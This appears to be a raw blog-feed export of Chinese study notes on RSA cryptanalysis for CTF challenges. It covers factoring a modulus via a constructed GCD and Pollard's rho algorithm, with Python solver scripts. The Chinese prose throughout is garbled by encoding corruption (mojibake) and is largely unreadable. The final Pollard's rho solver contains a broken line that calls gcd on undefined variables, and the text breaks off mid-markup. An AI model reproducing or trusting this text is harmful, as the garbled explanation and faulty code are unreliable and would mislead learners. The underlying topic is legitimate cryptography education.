$p$</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">enc=</span><br><span class="line">n=</span><br><span class="line">something=</span><br><span class="line">nothing=</span><br><span class="line">e=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e=sympy.nextprime(e)</span><br><span class="line">        a=pow(<span class="number">2</span>,e*something-e*nothing,n)<span class="number">-1</span></span><br><span class="line">        p=libnum.gcd(a,n)</span><br><span class="line">        q=n/p</span><br><span class="line">        fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">        d=invert(e,fn)</span><br><span class="line">        flag=libnum.n2s(pow(enc,d,n))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hebtu"</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="æ„é€ GCD"><a href="#æ„é€ GCD" class="headerlink" title="æ„é€ GCD"></a>æ„é€ GCD</h3><p>å¯ä»¥çœ‹å‡ºï¼Œæ„é€ gcdæ¥æ±‚å¤§æ•°nçš„å› å­ä»¥æ­¤æ¥åˆ†è§£næ˜¯ä¸€ç§å¾ˆå¥½åˆå¾ˆå·§å¦™çš„æ–¹å¼,æ¥çœ‹è¿™ä¸€é¢˜</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">a=int(pow((q+p),2019,n))</span><br><span class="line">b=int(pow(p+2019,q,n))</span><br><span class="line">n=</span><br><span class="line">a=</span><br><span class="line">b=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæˆ‘ä»¬è¦é€šè¿‡å·²ç»™å‡ºçš„aå’Œbï¼Œæ¥åˆ†è§£n</p><p>é€šè¿‡aï¼Œbå’Œpï¼Œqçš„å…³ç³»ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•ç”¨a,bå‡‘å‡ºä¸€ä¸ªGCDæ¥æ±‚å‡ºnçš„ä¸€ä¸ªå› å­</p><p>è§£é¢˜è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>ç”±$ a \equiv  (p+q)^{2019} \pmod{n}$</p><p>å¯å¾—    $a \equiv  (p+q)^{2019} \equiv  p^{2019}  \pmod{q}$        ã€äºŒé¡¹å¼å±•å¼€å®šç†ã€‘</p><p>ç”±$ b \equiv  (p+2019)^q \pmod{n}$</p><p>å¯å¾— $b \equiv  (p+2019)^q \equiv  p+2019  \pmod{q}$            ã€è´¹é©¬å°å®šç†ï¼š$(p+2019)^q-1 \equiv  1 \pmod{q}$ã€‘</p><p>æ‰€ä»¥$ a \equiv  (b - 2019)^{2019} \pmod{q}$</p><p>â€‹    å³$ a =  (b - 2019)^2019 + kq$</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‡‘å‡ºä¸€ä¸ª$GCD$</p><p>$GCDï¼ˆ (b - 2019)^{2019}-aï¼Œnï¼‰=  GCDï¼ˆ Kqï¼Œnï¼‰= q$</p><p>è§£é¢˜å®Œæ¯•</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸€æ¬¡å­¦ä¹ äº†æ•°è®ºå››å¤§å®šç†çš„è¯æ˜ã€åº”ç”¨ï¼Œä»¥åŠrabinå¯†ç çš„è§£æ³•ã€‚å‘ç°å…¶å®å¾ˆå¤šè§£æ³•ã€æ”»å‡»æ–¹æ³•éƒ½æ˜¯å¤šç§å®šç†çš„ç»“åˆè¿ç”¨ï¼Œæœ‰æ—¶å€™è¿˜è¦å¼•å‡ºå„ç§æ¨è®ºï¼Œå¾ˆçµæ´»</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>æ¬§æ‹‰å®šç†è¯æ˜ï¼š <a href="https://www.cnblogs.com/wangxiaodai/p/9758242.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangxiaodai/p/9758242.html</a> </p><p>ä¸­å›½å‰©ä½™å®šç†è¯æ˜ï¼š <a href="https://blog.csdn.net/Rain722/article/details/53230707" target="_blank" rel="noopener">https://blog.csdn.net/Rain722/article/details/53230707</a> </p><p>å¨å°”é€Šå®šç†è¯æ˜ï¼š <a href="https://www.cnblogs.com/Judge/p/10755703.html" target="_blank" rel="noopener">https://www.cnblogs.com/Judge/p/10755703.html</a> </p><p>Rabinç®—æ³•ï¼š <a href="https://veritas501.space/2017/03/01/å¯†ç å­¦ç¬”è®°/" target="_blank" rel="noopener">https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</a> </p><p> <a href="https://xz.aliyun.com/t/5113" target="_blank" rel="noopener">https://xz.aliyun.com/t/5113</a> </p><p> <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a> </p><p> <a href="https://blog.csdn.net/qq_24451605/article/details/45093911" target="_blank" rel="noopener">https://blog.csdn.net/qq_24451605/article/details/45093911</a> </p><p>æœ€åæ„Ÿè°¢Lurå¤§ä½¬çš„ä¸€æ‰‹æŒ‡ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> number theory </tag>
            
            <tag> Abstract algebra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æµ…æPollard&#39;s rho algorithmåŠå…¶åº”ç”¨</title>
      <link href="/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/"/>
      <url>/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©åœ¨å­¦å¯†ç å­¦ï¼Œå…¶ä¸­æœ‰å…³RSAçš„å†…å®¹ã€‚ç”±äºå„ç§æ”»å‡»ç®—æ³•çš„å‡ºç°ï¼ŒRSAç°åœ¨å…¶å®å·²ç»ä¸å¤ªå®‰å…¨äº†(ç”±äºä¸æ°å½“çš„å‚æ•°çš„ä½¿ç”¨)ï¼Œä½†ä¸å¾—ä¸æ‰¿è®¤çš„æ˜¯ï¼Œå½“ä»ŠRSAåŠ å¯†æŠ€æœ¯è¿˜æ˜¯è¢«æ™®éåº”ç”¨çš„~</p><p>ç„¶ååœ¨åšé¢˜çš„æ—¶å€™ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€é¢˜</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.<span class="keyword">number</span> import getPrime, isPrime</span><br><span class="line">flag = <span class="string">'BCNS&#123;***************&#125;'</span></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gbits = <span class="number">1000</span></span><br><span class="line">g = getPrime(<span class="keyword">int</span>(gbits))</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">a</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    <span class="keyword">p</span> = <span class="number">2</span> * g * <span class="keyword">a</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="keyword">p</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">b</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    q = <span class="number">2</span> * g * <span class="keyword">b</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">p</span> != q <span class="built_in">and</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">N</span> = <span class="keyword">p</span> * q</span><br><span class="line"><span class="keyword">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">def str2int(s):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'pubkey.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">e</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">N</span>) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plain = str2int(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">c</span> = <span class="built_in">pow</span>(plain, <span class="keyword">e</span>, <span class="keyword">N</span>)</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'cipher.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(hex(<span class="keyword">c</span>))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¼•å…¥<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf" target="_blank" rel="noopener">Further Attacks on Server-Aided RSA Cryptosystems</a></p><p>Further Attacks on Server-Aided RSA Cryptosystemsè§£å†³çš„æ˜¯å¤§æ•°åˆ†è§£çš„ä¸€ä¸ªé—®é¢˜ï¼Œ</p><p>åˆ©ç”¨æ¡ä»¶æ˜¯å½“$N=p*q(Nâ‰¥512bit)$,å…¶ä¸­ï¼Œ$(p-1)$å’Œ $(q-1)$æœ‰ä¸€ä¸ªå¤§çš„å…¬å› æ•°Î²</p><p>åœ¨Further Attacks on Server-Aided RSA Cryptosystemsçš„ç¬¬ä¸€ä¸ªæ”»å‡»é˜¶æ®µä¸­æåˆ°ï¼šè¿ç”¨Pollardâ€™s Ï methods ï¼Œå…¶ä¸­ç”¨äºå–ä¼ªéšæœºå€¼çš„mapså‡½æ•°ä¸º $g(x)=x^{N-1}+3 \pmod {N}$ï¼Œè¿™å°†åœ¨æ—¶é—´å¤æ‚åº¦O($\sqrt{p/Î²}$)å†…åˆ†è§£Nï¼Œå› ä¸ºåœ¨$x^{N-1}\pmod{N}$ä¸­ï¼Œè‡³å¤šæœ‰ $\frac{(p-1)}{Î²}+1$ä¸ªå€¼</p><h2 id="Pollardâ€™s-Ï-algorithm"><a href="#Pollardâ€™s-Ï-algorithm" class="headerlink" title="Pollardâ€™s Ï algorithm"></a>Pollardâ€™s Ï algorithm</h2><p>æ³¢æ‹‰å¾·çš„ Ï ç®—æ³•æ˜¯æ•´æ•°åˆ†è§£çš„ä¸€ç§ç®—æ³•ã€‚ å®ƒæ˜¯çº¦ç¿° Â· æ³¢æ‹‰å¾·åœ¨1975å¹´å‘æ˜çš„ã€‚ å®ƒåªå ç”¨äº†å¾ˆå°‘çš„ç©ºé—´ï¼Œå¹¶ä¸”å®ƒçš„é¢„æœŸè¿è¡Œæ—¶é—´ä¸è¢«åˆ†è§£çš„åˆæ•°çš„æœ€å°è´¨å› æ•°å¤§å°çš„å¹³æ–¹æ ¹æˆæ­£æ¯”</p><h3 id="æ ¸å¿ƒæ€æƒ³"><a href="#æ ¸å¿ƒæ€æƒ³" class="headerlink" title="æ ¸å¿ƒæ€æƒ³"></a>æ ¸å¿ƒæ€æƒ³</h3><p>å‡è®¾æˆ‘ä»¬éœ€è¦åˆ†è§£$n$ï¼Œ$n=q*p$ï¼Œå…¶ä¸­$q$ä¸º$n$çš„éå¹³å‡¡å› å­ï¼ˆå³$q$ä¸ç­‰äº$1$ æˆ–$ n$)ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¨¡$n$çš„å¤šé¡¹å¼ï¼Œä¾‹å¦‚ï¼š$g(x) \equiv x^2+1 \pmod{n}$ï¼Œç”¨äºç”Ÿæˆâ€œä¼ªéšæœºâ€æ•°åˆ—ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªèµ·å§‹å€¼ï¼Œä¾‹å¦‚ï¼Œ$2$ï¼Œå³$x_1=g(2)ï¼Œx_2=g(g(2))ï¼Œx<del>3</del>=g(g(g(2)))â€¦â€¦$</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ•°åˆ—æ˜¯æœ‰é™çš„ï¼Œç”±äºç”Ÿæ—¥é—®é¢˜ï¼Œåºåˆ— $x_k $modï¼ˆ$n$ï¼‰æœ€ç»ˆä¼šé‡å¤ï¼Œä¸€æ—¦ä¸€ä¸ªåºåˆ—ç”±é‡å¤çš„å€¼ï¼Œè¿™ä¸ªåºåˆ—å°±ä¼šå¾ªç¯ï¼Œå› ä¸ºæ¯ä¸ªå€¼ä¾èµ–äºå®ƒä¹‹å‰çš„å€¼ï¼Œ è¿™ç§æœ€ç»ˆå¾ªç¯çš„ç»“æ„äº§ç”Ÿäº†â€œ Ï ç®—æ³•â€çš„åç§°</p><p><img src="https://i.loli.net/2020/04/30/P9MQvlALodTsRI2.png" alt="Ï"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸¾ä¸€ä¸ªç®€å•çš„å°ä¾‹å­ï¼Œæˆ‘ä»¬è®¾$n$ä¸º640ï¼Œ$g(x)=x^2$ï¼Œ$x$èµ·å§‹å€¼ä¸º2ï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    b*=2</span><br><span class="line">    <span class="builtin-name">print</span> b%640</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Y8631MqfrxRKCmt.png" alt="example"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ128ä¸ºè¿™ä¸ªå–æ¨¡å¤šé¡¹å¼çš„å¾ªç¯èŠ‚ç‚¹ï¼Œ</p><p>å›åˆ°è¯é¢˜ï¼Œè¿™é‡Œç»§ç»­ç”¨ Floydâ€™s cycle-finding algorithmå‘ç°ï¼šè®¾ç«‹ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ$i$ï¼Œ$j$ï¼Œåœ¨æ¯ä¸€æ­¥ä¸­ï¼Œ$i$æ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œ$j$æ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œç„¶åæ£€æŸ¥$gcd(x_i-x_j,n)$æ˜¯å¦â‰ 1ï¼Œå¦‚æœä¸ç­‰äºï¼Œé‚£ä¹ˆ$gcd$çš„ç»“æœä¾¿æ˜¯$p$ã€‚å¹¶ä¸”ï¼Œè¿™ä¹Ÿæ„å‘³ç€åºåˆ—${ x_k \pmod p}$ä¹Ÿä¼šé‡å¤ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¦‚æœ$x_i \equiv x_j \pmod{p}$, é‚£ä¹ˆ$x_i$ä¸$x_j$ä¹‹é—´çš„å·®å¿…ç„¶æ˜¯$p$çš„å€æ•°ã€‚åŒæ—¶ï¼Œè¿™ä¹Ÿè¯´æ˜ï¼Œ$gcd(x_i-x_jï¼Œn)$ä¸ç­‰äº1çš„ç»“æœæ— è®ºå¦‚ä½•æœ€ç»ˆéƒ½ä¼šåˆ°æ¥ï¼Œä½†æ˜¯å¯èƒ½æ˜¯$n$è‡ªå·±ï¼Œæ­¤æ—¶ï¼Œä»£è¡¨Pollardâ€™s Ï algorithmå¤±è´¥äº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„èµ·å§‹å€¼ï¼Œå†æ¬¡è¿ç®—ã€‚</p><h3 id="ä»£ç è¡¨ç¤º"><a href="#ä»£ç è¡¨ç¤º" class="headerlink" title="ä»£ç è¡¨ç¤º"></a>ä»£ç è¡¨ç¤º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: "</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="å˜ä½“"><a href="#å˜ä½“" class="headerlink" title="å˜ä½“"></a>å˜ä½“</h3><p>1980å¹´ï¼ŒRichard Brent å‘è¡¨äº† rho ç®—æ³•çš„ä¸€ä¸ªæ›´å¿«çš„å˜ä½“ã€‚ ä»–ä½¿ç”¨äº†ä¸Pollardç›¸åŒçš„æ ¸å¿ƒæ€æƒ³ï¼Œä½†æ˜¯ä½¿ç”¨äº†ä¸åŒçš„å¾ªç¯æ£€æµ‹æ–¹æ³•ï¼Œç”¨ç›¸å…³çš„ Brentâ€™s cycle finding methodå–ä»£äº† Floydâ€™s cycle-finding algorithm</p><p>ä»–è§‚å¯Ÿåˆ°ï¼Œå¦‚æœ $gcd(a,n)&gt;1$ï¼Œé‚£ä¹ˆ$gcd(a*b,n)&gt;1$ï¼ˆbä¸ºä»»æ„æ­£æ•´æ•°ï¼‰ã€‚æ‰€ä»¥ï¼Œå–ä»£Floydâ€™s cycle-finding algorithmçš„æ¯ä¸€æ­¥éƒ½æ£€æŸ¥$gcd(a,n)$ï¼Œä»–å®šä¹‰äº†ä¸€ä¸ª$zï¼Œz=(x_2-x_3Â·(x_3-x_5â€¦â€¦(x_{101}-x_{201} \pmod {n} $å³æ¯ä¸€ç™¾æ­¥æ‰æ£€æŸ¥ä¸€æ¬¡$gcd(x_i-x_j,n)$ï¼Œè¿™ä¹ˆä½œä¸»è¦æ˜¯ä¸ºäº†åŠ é€Ÿç»“æœã€‚ ä½†æœ‰æ—¶å®ƒå¯èƒ½ä¼šå¼•å…¥é‡å¤å› å­å¯¼è‡´ç®—æ³•å¤±è´¥ï¼Œä¾‹å¦‚å½“næ˜¯ä¸€ä¸ªæ­£æ–¹å½¢æ—¶ã€‚ ä½†æ˜¯è¿™æ ·ä½¿ç”¨å¸¸è§„ç®—æ³•å°±å¥½äº†ã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é‚£ä¹ˆå›è¿‡å¤´æ¥æˆ‘ä»¬è§£æœ€åˆå‡ºç°çš„é‚£ä¸€é“é¢˜ï¼Œé¢˜ä¸­ï¼Œ$p-1$å’Œ$q-1$æœ‰å¾ˆæ˜æ˜¾çš„å…¬å› å­2gï¼Œäºæ˜¯æ ¹æ®Further Attacks on Server-Aided RSA Cryptosystemsä¸­The first stage of the attackæ‰€æåˆ°çš„ï¼Œä¸ºäº†åˆ†è§£nï¼Œæˆ‘ä»¬åªéœ€è¦è¿ç”¨Pollardâ€™s Ï algorithmï¼Œå…¶ä¸­ç”¨äºç”Ÿæˆâ€œä¼ªéšæœºâ€æ•°åˆ—çš„å¤šé¡¹å¼ä¸ºï¼š$g(x)=(x^{n-1}+3)$%$n$</p><p>pythonä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(pow(x,n<span class="number">-1</span>,n)+<span class="number">3</span>)%n    <span class="comment">#pow(x,n-1,n)æ˜¯ä¸ºäº†å‡å°æ•°å€¼ï¼ŒåŠ é€Ÿè¿ç®—ï¼Œ</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: "</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pollard_rho(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">n= <span class="comment">#é¢˜ç›®æ‰€ç»™        </span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/qanOpY2NcVIiwPu.png" alt="Pollard&#39;s Ï algorithm"></p><p>è¿è¡Œåæ¥ç§’æˆåŠŸåˆ†è§£ã€‚</p><h3 id="UNCTF-simple-rsa"><a href="#UNCTF-simple-rsa" class="headerlink" title="UNCTF-simple_rsa"></a>UNCTF-simple_rsa</h3><p>å‰å‡ å¤©æ‰“çš„UNCTFå…¶ä¸­æœ‰ä¸€é“æå…¶ç®€å•ç²—æš´çš„rsaçš„é¢˜ç›®</p><p>é¢˜ç›®ç®€å•ç²—æš´ï¼Œç»™äº†$e,n,c$</p><p><img src="https://i.loli.net/2020/04/30/ADkIoxrlGgvdBif.png" alt="UNCTF-simple_rsa"></p><p>æ˜¾ç„¶æ˜¯è¦åˆ†è§£$n$å¾—åˆ°$p$å’Œ$q$</p><p>ä½†æ˜¯ï¼Œå…¶ä¸­ï¼Œ$n$æœ‰2092ä½ï¼Œé™¤éäººæ‰‹è¶…ç®—~</p><p>ä½†å…¶å®è¿™é‡Œå¯ä»¥ç”¨åˆ°Pollardâ€™s Ï algorithmï¼Œå‰é¢æåˆ°å®ƒçš„é¢„æœŸè¿è¡Œæ—¶é—´ä¸è¢«åˆ†è§£çš„åˆæ•°çš„æœ€å°è´¨å› æ•°å¤§å°çš„å¹³æ–¹æ ¹æˆæ­£æ¯”</p><p>è€Œè¿™ä¹ˆå¤§çš„æ¨¡æ•°$n$ï¼Œæ˜¾ç„¶ä¸å¯èƒ½åªæœ‰$p,q$ä¸¤ä¸ªå› æ•°ï¼Œå¦åˆ™çœŸçš„æ˜¯è¦è®©è¶…ç®—å‡ºåŠ¨ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹$n$æ˜¯ç”±è‹¥å¹²ä¸ªå°ç´ æ•°çš„ä¹˜ç§¯è€Œæ¥</p><p>äºæ˜¯åˆ©ç”¨Pollardâ€™s Ï algorithmåˆ†è§£è¿™ä¸ª$n$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        x1 = mapx(x1)</span><br><span class="line">        x2 = mapx(mapx(x2))</span><br><span class="line">        p = gcd(a - i, n)</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">n=...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n!=<span class="number">1</span>):</span><br><span class="line">    p = pollard_rho(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">    <span 